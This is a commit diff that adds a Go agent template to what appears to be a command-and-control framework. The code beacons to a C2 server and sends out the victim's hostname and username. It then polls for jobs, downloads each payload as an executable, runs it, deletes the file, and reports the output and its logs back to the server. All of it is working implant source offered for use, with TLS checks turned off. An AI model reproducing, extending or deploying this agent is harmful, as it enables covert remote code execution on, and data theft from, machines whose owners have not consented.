aed59710e01c4f5f01cb44f0526b2b46ac3d0303
whatsyourask <lexeymartynov@gmail.com>
2024-05-06 00:23:22 +0300

    Changed again PayloadGenerator structure to StageOnePayloadGeneratorModule, and of course added a working template for agent's executable, fully workable now, I think

--- payload_generator/templates/agent.go
+++ payload_generator/templates/agent.go
@@ -4,52 +4,295 @@ import (
 	"bytes"
 	"crypto/tls"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io"
 	"net"
 	"net/http"
 	"os"
+	"os/exec"
 	"os/user"
+	"strings"
 	"time"
+
+	"github.com/rs/zerolog"
 
 	"github.com/google/uuid"
 )
 
 var AuthorizationToken string
 var AuthorizationTokenExpire string
+var JobsQueue []string
 
-func AGENTJOB() {
-	CHECKCONNECTION()
-	TRYTOCONNECT()
-	CHECKJOBS()
-}
+var connectionErr = fmt.Errorf("can't connect to a C2")
+var marshalErr = fmt.Errorf("can't marshal a data for json")
+var requestCreationErr = fmt.Errorf("can't create a new request")
+var requestSendingErr = fmt.Errorf("can't perform a request")
+var responseReadingErr = fmt.Errorf("can't do io.ReadAll")
+var unmarshalErr = fmt.Errorf("can't unmarshal a JSON in response")
+var credentialsErr = fmt.Errorf("can't login with this credentials:")
+var hostnameErr = fmt.Errorf("can't get hostname of a victim")
+var usernameErr = fmt.Errorf("can't get a username on a victim")
+var noJobsErr = fmt.Errorf("no jobs to run")
+var fileCreationErr = fmt.Errorf("can't create a file")
+var fileWritingErr = fmt.Errorf("can't write to a file")
+var payloadExecutionErr = fmt.Errorf("payload execution was unsuccessful")
+var fileDeletionErr = fmt.Errorf("can't delete a file wit payload")
+var LogBuffer bytes.Buffer
+var Logger = zerolog.New(&LogBuffer).With().Timestamp().Logger()
 
-func CHECKCONNECTION() {
+func AGENT() {
+	JobsQueue = make([]string, 0)
 	for {
-		conn, err := net.Dial("tcp", "C2SERVER:C2PORT")
-		if err == nil {
-			break
+		for {
+			err := CHECKCONNECTION()
+			if !errors.Is(err, connectionErr) {
+				break
+			} else {
+				time.Sleep(time.Second * 7)
+			}
 		}
-		defer conn.Close()
-		time.Sleep(time.Second * 3)
+		for {
+			err := TRYTOCONNECT()
+			if errors.Is(err, nil) {
+				break
+			} else {
+				time.Sleep(time.Second * 5)
+			}
+		}
+		for {
+			err := CHECKJOBS()
+			if errors.Is(err, nil) {
+				jobsStatus, jobsOut := DOJOBS()
+				UPDATEJOBSTATUS(jobsStatus, jobsOut)
+
+			} else if errors.Is(err, requestSendingErr) {
+				break
+			} else {
+				time.Sleep(time.Second * 3)
+			}
+			SENDLOGS()
+		}
+
 	}
 }
 
-func TRYTOCONNECT() {
+func CHECKCONNECTION() error {
+	conn, err := net.Dial("tcp", "HOST:PORT")
+	if err != nil {
+		Logger.Info().Str("status", "error").Str("stage", "connecting to C2").Msg(connectionErr.Error())
+		return connectionErr
+	}
+	defer conn.Close()
+	Logger.Info().Str("status", "success").Str("stage", "connecting to C2").Msg("Successfully connected to C2")
+	return nil
+}
+
+func TRYTOCONNECT() error {
 	id := uuid.New()
 	uuid := id.String()
-	hostname := GETHOSTNAME()
-	username := GETUSERNAME()
-	for {
-		connectPostBody := map[string]string{"uuid": uuid, "hostname": hostname, "username": username}
-		connectPostJson, err := json.Marshal(connectPostBody)
+	hostname, err := GETMACHINENAME()
+	if err != nil {
+		return err
+	}
+	username, err := GETUSERNAME()
+	if err != nil {
+		return err
+	}
+	connectPostBody := map[string]string{"uuid": uuid, "hostname": hostname, "username": username}
+	connectPostJson, err := json.Marshal(connectPostBody)
+	if err != nil {
+		return marshalErr
+	}
+	req, err := http.NewRequest("POST", "https://HOST:PORT/connect", bytes.NewBuffer(connectPostJson))
+	if err != nil {
+		return requestCreationErr
+	}
+	req.Header.Set("Content-Type", "application/json")
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	resp, err := client.Do(req)
+	if err != nil {
+		return requestSendingErr
+	}
+	respBody, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return responseReadingErr
+	}
+	var respJson struct {
+		Code   int    `json:"code"`
+		Expire string `json:"expire"`
+		Token  string `json:"token"`
+	}
+	err = json.Unmarshal(respBody, &respJson)
+	if err != nil {
+		return unmarshalErr
+	}
+	if respJson.Code == 200 {
+		AuthorizationToken = respJson.Token
+		AuthorizationTokenExpire = respJson.Expire
+		return nil
+	} else {
+		return credentialsErr
+	}
+}
+
+func GETMACHINENAME() (string, error) {
+	hostname, err := os.Hostname()
+	if err != nil {
+		Logger.Info().Str("status", "error").Str("stage", "getting hostname").Msg(hostnameErr.Error())
+		return "", hostnameErr
+	}
+	Logger.Info().Str("status", "success").Str("stage", "getting hostname").Msg("Successfully got a hostname")
+	return hostname, nil
+}
+
+func GETUSERNAME() (string, error) {
+	user, err := user.Current()
+	if err != nil {
+		Logger.Info().Str("status", "error").Str("stage", "getting username").Msg(usernameErr.Error())
+		return "", usernameErr
+	}
+	Logger.Info().Str("status", "success").Str("stage", "getting username").Msg("Successfully got a username")
+	return user.Username, nil
+}
+
+func CHECKJOBS() error {
+	req, err := http.NewRequest("GET", "https://HOST:PORT/agent/jobs", nil)
+	if err != nil {
+		Logger.Info().Str("status", "error").Str("stage", "checking jobs").Msg(requestCreationErr.Error())
+		return requestCreationErr
+	}
+	req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	resp, err := client.Do(req)
+	if err != nil {
+		Logger.Info().Str("status", "error").Str("stage", "checking jobs").Msg(requestSendingErr.Error())
+		return requestSendingErr
+	}
+	respBody, err := io.ReadAll(resp.Body)
+	if err != nil {
+		Logger.Info().Str("status", "error").Str("stage", "checking jobs").Msg(responseReadingErr.Error())
+		return responseReadingErr
+	}
+	var respJson []string
+	err = json.Unmarshal(respBody, &respJson)
+	if err != nil {
+		Logger.Info().Str("status", "error").Str("stage", "checking jobs").Msg(unmarshalErr.Error())
+		return unmarshalErr
+	}
+	if len(respJson) == 0 {
+		return noJobsErr
+	} else {
+		JobsQueue = append(JobsQueue, respJson...)
+		Logger.Info().Str("status", "success").Str("stage", "checking jobs").Msg(fmt.Sprintf("Jobs were added: %v", respJson))
+		return nil
+	}
+}
+
+func DOJOBS() (map[string]bool, map[string]string) {
+	jobsStatus := make(map[string]bool)
+	jobsOut := make(map[string]string)
+	for _, jobUuid := range JobsQueue {
+		req, err := http.NewRequest("GET", "https://HOST:PORT/agent/jobs/"+jobUuid+"/payload/", nil)
 		if err != nil {
-			fmt.Println(fmt.Errorf("can't marshal a json for POST login: %v", err))
+			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("executing jobs - %s", jobUuid)).Msg(requestCreationErr.Error())
+			jobsStatus[jobUuid] = false
 		}
-		req, err := http.NewRequest("POST", "https://C2SERVER:C2PORT/connect", bytes.NewBuffer(connectPostJson))
+		req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
+		client := &http.Client{
+			Transport: &http.Transport{
+				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+			},
+		}
+		resp, err := client.Do(req)
 		if err != nil {
-			fmt.Println(fmt.Errorf("can't create a POST request: %v", err))
+			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("executing jobs - %s", jobUuid)).Msg(requestSendingErr.Error())
+			jobsStatus[jobUuid] = false
 		}
+		respBody, err := io.ReadAll(resp.Body)
+		if err != nil {
+			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("executing jobs - %s", jobUuid)).Msg(responseReadingErr.Error())
+			jobsStatus[jobUuid] = false
+		}
+		payloadFilename := jobUuid + ".exe"
+		err = WRITETOFILE(payloadFilename, string(respBody))
+		if err != nil {
+			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("executing jobs - %s", jobUuid)).Msg(err.Error())
+			jobsStatus[jobUuid] = false
+		}
+		jobOut, err := RUNJOB(payloadFilename)
+		if !errors.Is(err, payloadExecutionErr) {
+			if len(jobOut) == 0 {
+				jobsOut[jobUuid] = "Job hasn't returned some output. But it seems ok."
+			} else {
+				jobsOut[jobUuid] = string(jobOut)
+			}
+			jobsStatus[jobUuid] = true
+			Logger.Info().Str("status", "success").Str("stage", fmt.Sprintf("executing jobs - %s", jobUuid)).Msg("Successfully executed the job")
+		} else {
+			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("executing jobs - %s", jobUuid)).Msg(err.Error())
+			jobsStatus[jobUuid] = false
+			jobsOut[jobUuid] = fmt.Sprintf("Job was executed with error: %v", err)
+		}
+	}
+	JobsQueue = []string{}
+	return jobsStatus, jobsOut
+}
+
+func WRITETOFILE(filename string, data string) error {
+	file, err := os.Create(filename)
+	if err != nil {
+		return fileCreationErr
+	}
+	defer file.Close()
+	_, err = io.WriteString(file, data)
+	if err != nil {
+		return fileWritingErr
+	}
+	return file.Sync()
+}
+
+func RUNJOB(payloadFilename string) ([]byte, error) {
+	payloadResults, err := exec.Command(".\\"+payloadFilename, "").Output()
+	if err != nil {
+		return nil, payloadExecutionErr
+	}
+	Logger.Info().Str("status", "success").Str("stage", fmt.Sprintf("running job - %s", payloadFilename)).Msg("Successfully executed the payload")
+	err = os.Remove(payloadFilename)
+	if err != nil {
+		return nil, fileDeletionErr
+	}
+	Logger.Info().Str("status", "success").Str("stage", fmt.Sprintf("running job - %s", payloadFilename)).Msg("Successfully removed the payload")
+	return payloadResults, nil
+}
+
+func UPDATEJOBSTATUS(jobsStatus map[string]bool, jobsOut map[string]string) {
+	for jobUuid, jobStatus := range jobsStatus {
+		var updateJobStatusBody struct {
+			JobUuid string `json:"job-uuid"`
+			Status  bool   `json:"status"`
+			Result  string `json:"job-result"`
+		}
+		updateJobStatusBody.JobUuid = jobUuid
+		updateJobStatusBody.Status = jobStatus
+		updateJobStatusBody.Result = jobsOut[jobUuid]
+		updateJobStatusJson, err := json.Marshal(updateJobStatusBody)
+		if err != nil {
+			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("updating job status - %s", jobUuid)).Msg(unmarshalErr.Error())
+		}
+		req, err := http.NewRequest("POST", "https://HOST:PORT/agent/jobs/update", bytes.NewBuffer(updateJobStatusJson))
+		if err != nil {
+			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("updating job status - %s", jobUuid)).Msg(requestCreationErr.Error())
+		}
+		req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
 		req.Header.Set("Content-Type", "application/json")
 		client := &http.Client{
 			Transport: &http.Transport{
@@ -58,122 +301,79 @@ func TRYTOCONNECT() {
 		}
 		resp, err := client.Do(req)
 		if err != nil {
-			fmt.Println(fmt.Errorf("can't perform a POST request: %v", err))
+			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("updating job status - %s", jobUuid)).Msg(requestSendingErr.Error())
 		}
 		respBody, err := io.ReadAll(resp.Body)
 		if err != nil {
-			fmt.Println(fmt.Errorf("can't do io.ReadAll: %v", err))
+			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("updating job status - %s", jobUuid)).Msg(responseReadingErr.Error())
 		}
 		var respJson struct {
-			Code   int    `json:"code"`
-			Expire string `json:"expire"`
-			Token  string `json:"token"`
+			Status string `json:"status"`
 		}
 		err = json.Unmarshal(respBody, &respJson)
 		if err != nil {
-			fmt.Println(fmt.Errorf("can't unmarshal a JSON in response: %v", err))
-		}
-		if respJson.Code == 200 {
-			AuthorizationToken = respJson.Token
-			AuthorizationTokenExpire = respJson.Expire
-			fmt.Println(AuthorizationToken)
-			break
-		} else {
-			fmt.Println(fmt.Errorf("can't login with this credentials: %v, %v", respJson.Code, err))
-			time.Sleep(time.Second * 5)
+			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("updating job status - %s", jobUuid)).Msg(unmarshalErr.Error())
 		}
 	}
 }
 
-func GETHOSTNAME() string {
-	hostname, err := os.Hostname()
+func SENDLOGS() {
+	type LogEntry struct {
+		Level   string `json:"level"`
+		Status  string `json:"status"`
+		Stage   string `json:"stage"`
+		Time    string `json:"time"`
+		Message string `json:"message"`
+	}
+	var logRequestBody []LogEntry
+	var tempLogEntry LogEntry
+	logs := LogBuffer.String()
+	logLines := strings.Split(logs, "\n")
+	for _, logLine := range logLines {
+		if logLine != "" {
+			err := json.Unmarshal([]byte(logLine), &tempLogEntry)
+			if err != nil {
+				Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(unmarshalErr.Error())
+			}
+			logRequestBody = append(logRequestBody, tempLogEntry)
+		}
+	}
+	logRequestJson, err := json.Marshal(logRequestBody)
 	if err != nil {
-		fmt.Println(fmt.Errorf("can't get hostname of a victim: %v", err))
+		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(marshalErr.Error())
 	}
-	return hostname
-}
-
-func GETUSERNAME() string {
-	user, err := user.Current()
+	req, err := http.NewRequest("POST", "https://HOST:PORT/agent/logs/add", bytes.NewBuffer(logRequestJson))
 	if err != nil {
-		fmt.Println(fmt.Errorf("can't get a username on a victim: %v", err))
+		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(requestCreationErr.Error())
 	}
-	return user.Username
-}
-
-func CHECKJOBS() {
-	for {
-		req, err := http.NewRequest("GET", "https://C2SERVER:C2PORT/agent/jobs", nil)
-		if err != nil {
-			fmt.Println(fmt.Errorf("can't create a new request: %v", err))
-		}
-		req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
-		client := &http.Client{
-			Transport: &http.Transport{
-				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-			},
-		}
-		resp, err := client.Do(req)
-		if err != nil {
-			fmt.Println(fmt.Errorf("can't perform a POST request: %v", err))
-		}
-		respBody, err := io.ReadAll(resp.Body)
-		if err != nil {
-			fmt.Println(fmt.Errorf("can't do io.ReadAll: %v", err))
-		}
-		var respJson []string
-		err = json.Unmarshal(respBody, &respJson)
-		fmt.Println(respJson)
-		if err != nil {
-			fmt.Println(fmt.Errorf("can't unmarshal a JSON in response: %v", err))
-		}
-		if len(respJson) == 0 {
-			time.Sleep(time.Second * 5)
-		} else {
-			DOJOBS(respJson)
-		}
+	req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
+	req.Header.Set("Content-Type", "application/json")
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
 	}
-}
-
-func DOJOBS(jobs []string) {
-	for _, job := range jobs {
-		req, err := http.NewRequest("GET", "https://C2SERVER:C2PORT/agent/payload/"+job, nil)
-		if err != nil {
-			fmt.Println(fmt.Errorf("can't create a new request: %v", err))
-		}
-		req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
-		client := &http.Client{
-			Transport: &http.Transport{
-				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-			},
-		}
-		resp, err := client.Do(req)
-		if err != nil {
-			fmt.Println(fmt.Errorf("can't perform a POST request: %v", err))
-
-		}
-		respBody, err := io.ReadAll(resp.Body)
-		if err != nil {
-			fmt.Println(fmt.Errorf("can't do io.ReadAll: %v", err))
-		}
-		err := WRITETOFILE()
-		RUNJOB()
-	}
-}
-
-func WRITETOFILE(filename string, data string) error {
-	file, err := os.Create(filename)
+	resp, err := client.Do(req)
 	if err != nil {
-		return fmt.Errorf("can't create a file %s: %v", filename, err)
+		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(requestSendingErr.Error())
 	}
-	defer file.Close()
-	_, err = io.WriteString(file, data)
+	respBody, err := io.ReadAll(resp.Body)
 	if err != nil {
-		return fmt.Errorf("can't write to a file %s: %v", filename, err)
+		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(responseReadingErr.Error())
 	}
-	return file.Sync()
+	var respJson struct {
+		Status string `json:"status"`
+	}
+	err = json.Unmarshal(respBody, &respJson)
+	if err != nil {
+		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(unmarshalErr.Error())
+	}
+	if respJson.Status != "ok" {
+		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg("Something wrong with a logging")
+	}
+	LogBuffer.Reset()
 }
 
 func main() {
-	AGENTJOB()
+	AGENT()
 }
